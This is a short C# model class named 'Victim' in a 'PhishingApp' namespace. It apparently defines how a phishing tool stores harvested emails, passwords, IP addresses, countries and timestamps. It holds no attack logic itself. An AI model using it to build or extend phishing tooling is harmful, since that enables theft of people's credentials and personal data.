namespace PhishingApp.Model
{
    public class Victim
    {
        public int Id { get; set; }
        public string Email { get; set; }
        public string Password { get; set; }
        public string IpAddress { get; set; }
        public string Country { get; set; }
        public long Timestamp { get; set; }

        public Victim() { }
    }
}
